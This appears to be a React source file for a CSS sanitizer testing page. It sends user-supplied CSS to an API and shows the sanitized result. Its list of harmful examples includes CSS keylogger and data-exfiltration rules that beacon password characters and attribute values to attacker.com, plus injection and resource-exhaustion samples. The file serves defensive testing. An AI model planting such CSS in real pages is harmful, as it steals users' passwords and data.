"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Textarea } from "@/components/ui/textarea"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

const HARMFUL_CSS_EXAMPLES = [
  {
    name: "CSS Injection",
    description: "Attempts to inject HTML via CSS",
    code: `body {
  background-image: url('javascript:alert("XSS")');
  behavior: url(attack.htc);
  -moz-binding: url("http://attacker.com/xbl.xml#exec");
}

@import url("http://attacker.com/malicious.css");

<style>body { color: red; }</style>
`,
  },
  {
    name: "CSS Keylogger",
    description: "Attempts to create a CSS-based keylogger",
    code: `input[type="password"][value$="a"] {
  background-image: url("https://attacker.com/log?key=a");
}
input[type="password"][value$="b"] {
  background-image: url("https://attacker.com/log?key=b");
}
/* ... and so on for other characters */
`,
  },
  {
    name: "Resource Exhaustion",
    description: "Attempts to cause high CPU/memory usage",
    code: `div {
  width: 999999999px;
  height: 999999999px;
}

${Array(1000).fill("*").join(" ")} {
  animation: spin 0.01s infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
`,
  },
  {
    name: "Data Exfiltration",
    description: "Attempts to steal data via CSS",
    code: `input[value^="a"] { background-image: url("https://attacker.com/steal?data=a"); }
input[value^="b"] { background-image: url("https://attacker.com/steal?data=b"); }
/* ... and so on for other characters */

/* Attribute selectors can be used to extract data */
[data-sensitive="secret"] { background-image: url("https://attacker.com/steal?data=secret"); }
`,
  },
]

export default function CSSSecurity() {
  const [inputCSS, setInputCSS] = useState("")
  const [outputCSS, setOutputCSS] = useState("")
  const [validationResult, setValidationResult] = useState<any>(null)
  const [isLoading, setIsLoading] = useState(false)

  const testSanitization = async () => {
    setIsLoading(true)
    try {
      const response = await fetch("/api/user-css", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ css: inputCSS }),
      })

      const data = await response.json()
      setOutputCSS(data.css || "/* Error processing CSS */")
      setValidationResult(data)
    } catch (error) {
      console.error("Error testing CSS sanitization:", error)
      setOutputCSS("/* Error processing CSS */")
      setValidationResult({ success: false, error: "Failed to process CSS" })
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="container mx-auto py-8">
      <h1 className="text-2xl font-bold mb-6">CSS Security Testing</h1>
      <p className="mb-6 text-gray-600">Test the CSS sanitization system with potentially harmful CSS patterns.</p>

      <Tabs defaultValue="tester">
        <TabsList>
          <TabsTrigger value="tester">CSS Sanitizer Tester</TabsTrigger>
          <TabsTrigger value="examples">Harmful Examples</TabsTrigger>
        </TabsList>

        <TabsContent value="tester">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <CardTitle>Input CSS</CardTitle>
              </CardHeader>
              <CardContent>
                <Textarea
                  value={inputCSS}
                  onChange={(e) => setInputCSS(e.target.value)}
                  placeholder="Enter CSS to test sanitization..."
                  className="font-mono min-h-[300px]"
                />
                <Button onClick={testSanitization} className="mt-4" disabled={isLoading}>
                  {isLoading ? "Processing..." : "Test Sanitization"}
                </Button>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Sanitized Output</CardTitle>
              </CardHeader>
              <CardContent>
                <Textarea
                  value={outputCSS}
                  readOnly
                  placeholder="Sanitized CSS will appear here..."
                  className="font-mono min-h-[300px]"
                />

                {validationResult && (
                  <div className="mt-4 p-4 border rounded-md">
                    <h3 className="font-semibold mb-2">Validation Result:</h3>
                    <pre className="text-sm overflow-auto">{JSON.stringify(validationResult, null, 2)}</pre>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        <TabsContent value="examples">
          <div className="space-y-6">
            {HARMFUL_CSS_EXAMPLES.map((example, index) => (
              <Card key={index}>
                <CardHeader>
                  <CardTitle>{example.name}</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="mb-4 text-gray-600">{example.description}</p>
                  <Textarea value={example.code} readOnly className="font-mono min-h-[150px]" />
                  <Button
                    onClick={() => {
                      setInputCSS(example.code)
                      // Switch to tester tab
                      document.querySelector('[data-state="inactive"][data-value="tester"]')?.click()
                    }}
                    className="mt-4"
                  >
                    Load Example
                  </Button>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
